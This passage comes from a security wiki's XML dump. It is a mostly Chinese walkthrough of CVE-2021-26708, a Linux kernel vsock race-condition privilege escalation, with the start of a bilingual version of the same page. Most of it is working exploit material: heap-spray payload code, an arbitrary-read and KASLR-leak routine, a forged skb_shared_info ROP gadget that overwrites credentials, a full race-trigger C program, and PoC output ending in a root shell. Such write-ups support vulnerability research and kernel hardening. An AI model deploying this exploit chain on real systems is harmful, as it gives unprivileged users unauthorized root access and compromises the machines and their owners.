    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>r94psivsalt1rqm71bjwnszgxzssjvz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/en</title>
    <ns>0</ns>
    <id>1757</id>
    <revision>
      <id>2164</id>
      <timestamp>2021-05-04T03:31:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;code&gt;vsock_stream_connect()&lt;/code&gt; contains a socket lock, and &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; in the parallel thread also tries to obtain it, which constitutes a cond..."</comment>
      <origin>2164</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27010" sha1="9gzbpkwla3wtsgpv39ruix1deeo21pl" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability==

These vulnerabilities are race conditions caused by incorrect locking in &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. These conditional competitions were implicitly introduced in the submission that added VSOCK multi-transport support in November 2019, and were merged into the Linux kernel 5.5-rc1 version.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; and &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; are provided as kernel modules in all major GNU/Linux distributions. When you create a socket for the AF_VSOCK domain, these vulnerable modules are automatically loaded.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

The creation of &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets is available to non-privileged users and does not require user name space.


==Memory corruption==

The following is a detailed introduction to the use of CVE-2021-26708, using the conditional competition in &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;. Two threads are required to reproduce. The first thread calls &lt;code&gt;setsockopt()&lt;/code&gt; :
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



The second thread changes the virtual socket transmission when &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt; tries to acquire the socket lock, by reconnecting the virtual socket:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


In order to process the &lt;code&gt;connect()&lt;/code&gt; of the virtual socket, the kernel executes &lt;code&gt;vsock_stream_connect()&lt;/code&gt; which calls &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function contains the following code:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt; contains a socket lock, and &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; in the parallel thread also tries to obtain it, which constitutes a conditional competition. Therefore, when the second &lt;code&gt;connect()&lt;/code&gt; is performed with a different &lt;code&gt;svm_cid&lt;/code&gt;, the &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; function is called. This function executes &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, releases &lt;code&gt;vsock_sock.trans&lt;/code&gt;, and &lt;code&gt;vsk-&gt;transport&lt;/code&gt; is set to NULL. When &lt;code&gt;vsock_stream_connect()&lt;/code&gt; releases the socket lock, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; can continue to execute. It calls &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, and then calls &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Here transport contains an outdated value from a local variable, which does not match &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (the original value is set to NULL).

When the kernel executes &lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;, memory corruption occurs:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
这里，vvs是指向内核内存的指针，它已经在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被释放。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小为64字节，位于kmalloc-64块缓存中。buf_alloc字段类型为u32，位于偏移量40。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。*val的值由攻击者控制，它的四个最不重要的字节被写入释放的内存中。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==模糊測試==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

